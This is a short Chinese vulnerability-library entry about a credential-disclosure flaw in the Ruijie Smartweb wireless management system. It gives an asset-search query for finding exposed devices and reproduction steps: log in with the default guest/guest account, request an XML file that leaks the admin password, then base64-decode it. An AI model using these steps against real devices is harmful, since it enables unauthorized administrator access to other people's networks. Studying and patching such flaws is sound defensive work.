---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 锐捷 Smartweb管理系统密码信息泄漏漏洞

# 一、漏洞描述
锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。

# 二、影响版本
+ 锐捷网络股份有限公司 无线smartweb管理系统

# 三、资产测绘
+ hunter`app.name="Ruijie 锐捷 Smartweb"`
+ 登录页面


# 四、漏洞复现
1. 使用默认口令`guest/guest`登录系统


2. 使用poc获取管理员`admin`账号密码

```plain
http://xx.xx.xx.xx/web/xml/webuser-auth.xml
```


3. base64解码后获取账号密码


4. 使用获取的管理账号admin登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/elegkbnby3vipdi9>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
